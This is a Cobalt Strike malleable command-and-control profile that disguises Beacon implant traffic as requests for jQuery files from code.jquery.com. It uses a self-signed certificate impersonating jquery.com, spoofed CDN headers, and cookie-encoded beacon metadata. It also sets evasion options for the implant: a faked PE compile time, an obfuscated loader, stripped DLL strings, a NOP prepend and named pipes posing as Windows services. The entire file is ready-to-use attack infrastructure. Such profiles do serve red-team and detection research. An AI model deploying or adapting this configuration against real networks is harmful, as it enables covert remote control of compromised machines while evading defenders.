# Author: Joe Vest, Andrew Chiles
# Version: CobaltStrike 3.11
# File: jquery-c2.3.11.profile
# Description: 
#   c2 profile attempting to mimic a jquery.js request
#   uses signed certificates (typically from Let's Encrypts)
#   or self-signed certificates

## BEACON SETTINGS
################################################
## Profile Name
## Defaults
##    sample_name: My Profile
set sample_name: "jQuery Profile";

## SleepTime
## Defaults
##    sleeptime: 60000
##    jitter: 0
## Guidelines:
##    - Beacon Timing (1000 = 1 sec)
##    - Consider using odd jitter time so the time doesnt loop back on itself (not verified as a technique)
##    - 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67
## ---------------------
#set sleeptime "60000";        # 1 Minute
#set sleeptime "300000";       # 5 Minutes
set sleeptime "6000000";      # 10 Minutes
#set sleeptime "9000000";      # 15 Minutes
#set sleeptime "1200000";      # 20 Minutes
#set sleeptime "1800000";      # 30 Minutes
#set sleeptime "3600000";      # 1 Hours
set jitter    "37";            # % jitter

## UserAgents
## Defaults
##    useragent: Internet Explorer (Random)
## Guidelines:
##    - Use a UserAgent that fits with your engagement
## ---------------------
#set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)"; # IE 10
set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"; # MS IE 11 User Agent
#set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36";
#set useragent "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
#set useragent "Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0";
#set useragent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/6.0)";
#set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
#set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)";

## SpawnTo Process
## Defaults:
##    spawnto_x86: 	%windir%\syswow64\rundll32.exe
##    spawnto_x64: 	%windir%\sysnative\rundll32.exe
## Guidelines
##    - a binary that executes without the UAC bit
##    - 64 bit for x64
##    - 32 bit for x86
##    - The binary doesnt do anything wierd (reboot, GUI popup, etc)
## ---------------------
set spawnto_x86 "%windir%\\syswow64\\eventvwr.exe";
set spawnto_x64 "%windir%\\sysnative\\eventvwr.exe";

################################################
## SMB beacons
################################################
## Defaults
##    pipename: msagent_##
##    pipename_stager: status_##
## Guidelines
##    - Do not use an existing namedpipe, Beacon doesn't check for conflict     
## ---------------------
set pipename        "wkssvc_##";
set pipename_stager "spoolss_##";

################################################
## DNS beacons
################################################
## Defaults
##   maxdns: 255
##   dns_idle: 0.0.0.0
##   dns_max_txt: 252
##   dns_sleep: 0
##   dns_stager_prepend: N/A
##   dns_stager_subhost: .stage.123456.
##   dns_ttl: 1
## Guidelines
## ---------------------

set maxdns          "255";
set dns_max_txt     "252";
set dns_idle        "74.125.196.113"; #google.com (change this to match your campaign)
set dns_sleep       "0"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_stager_prepend ".resources.123456.";
set dns_stager_subhost ".feeds.123456.";

################################################
## SSL CERTIFICATE
################################################
https-certificate {
    
    # Signed Certificate
    #set keystore "/pathtokeystore";
    #set password "password";

    # Self-Signed Certificate
    set C   "US";
    set CN  "jquery.com";
    set O   "jQuery";
    set OU  "Certificate Authority";
    set validity "365";
}

################################################
## Headers for staging process
################################################
http-stager {  
    set uri_x86 "/jquery-3.2.1.slim.min.js";
    set uri_x64 "/jquery-3.2.2.slim.min.js";

    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {            
            prepend "/*! jQuery v3.2.1 | (c) JS Foundation and other contributors | jquery.org/license */ !function=";
            print;
        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
}

################################################
## Memory Indicators
################################################
## Defaults
##    checksum      	0	The CheckSum value in Beacon's PE header
##    cleanup           false	Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
##    compile_time	    14 July 2009 8:14:00	The build time in Beacon's PE header
##    entry_point	    92145	The EntryPoint value in Beacon's PE header
##    image_size_x64	512000	SizeOfImage value in x64 Beacon's PE header
##    image_size_x86	512000	SizeOfImage value in x86 Beacon's PE header
##    module_x64	    xpsservices.dll	Same as module_x86; affects x64 loader
##    module_x86	    xpsservices.dll	Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
##    name	            beacon.x64.dll	The Exported name of the Beacon DLL
##    obfuscate	        false	Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
##    rich_header		Meta-information inserted by the compiler
##    stomppe	        true	Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
##    userwx	        false	Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory

stage {
    set userwx         "false"; 
    set compile_time   "14 Jul 2009 8:14:00";
    set image_size_x86 "510000";
    set image_size_x64 "510000";
    set entry_point    "93176";
    set obfuscate      "true";
    set name           "srv.dll";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "execute";
        strrep "This program cannot be run in DOS mode" "";
        strrep "beacon.dll"       "";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "execute";
        strrep "beacon.x64.dll"   "";
    }

    stringw "jQuery";
}

################################################
## HTTP GET
################################################
http-get {

    set uri "/jquery-3.2.1.min.js";
    set verb "GET";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            base64;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {

        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {            
            base64;
            prepend "/*! jQuery v3.2.1 | (c) JS Foundation and other contributors | jquery.org/license */ !function=";
            print;
        }
    }
}

################################################
## HTTP POST
################################################
http-post {
    
    set uri "/jquery-1.12.4.js";
    set verb "POST";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
       
        id {            
            parameter "session";            
        }
              
        output {
            base64url;
            print;
        }
    }

    server {

        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            base64;
            prepend "/*! jQuery v3.2.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            print;
        }
    }
}
